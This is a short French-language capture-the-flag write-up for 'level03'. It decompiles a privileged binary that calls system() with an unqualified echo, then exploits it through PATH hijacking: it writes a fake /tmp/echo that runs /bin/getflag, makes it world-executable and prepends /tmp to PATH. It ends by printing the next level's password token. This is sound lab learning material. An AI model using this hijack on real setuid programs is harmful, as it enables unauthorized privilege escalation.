# Rapport CTF - [level03]

### Observation:
En arrivant sur le niveau on trouve un exécutable nommé `level03` qui a été créé par flag03: `ls -la`

### Code:
Nous allons donc décompiler le code pour pouvoir le comprendre.
On utilise la commande `scp` pour ramener l'exécutable sur notre pc:
`scp -P {PORT} level03@localhost:/home/user/level03/level03 .`

En décompilant grace a Ghidra ou Hex-Ray nous obtenons le code suivant:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
__gid_t v4; // [esp+18h] [ebp-8h]
__uid_t v5; // [esp+1Ch] [ebp-4h]

v4 = getegid();
v5 = geteuid();
setresgid(v4, v4, v4);
setresuid(v5, v5, v5);
return system("/usr/bin/env echo Exploit me");
}
```
On remarque que le `echo` est lancé depuis l'env.



### Solution :
Nous avons donc 2 solutions:
 1. Changer la variable d'environnement echo
 2. Ajouter une variable d'environnement echo qui lance une commande

Nous allons faire cette 2eme solution, car c'est la plus simple à enlever.
La première étape consiste a créer un fichier qui se nomme echo avec la commande à exécuter à l'intérieur:
`echo /bin/getflag > /tmp/echo`
Nous devons aussi lui donné les droits d'être exécuté par un autre programme:
`chmod 777 /tmp/echo`

Puis on ajoute notre chemin d'accés à notre echo dans les variables d'environnement:
`export PATH=/tmp:$PATH`

On lance ensuite notre programme, `./level03`

Et il nous donne directement le mot de passe de l'utilisateur level04 sans avoir besoin de passer par le flag03.

token : qi0maab88jeaj46qoumi7maus
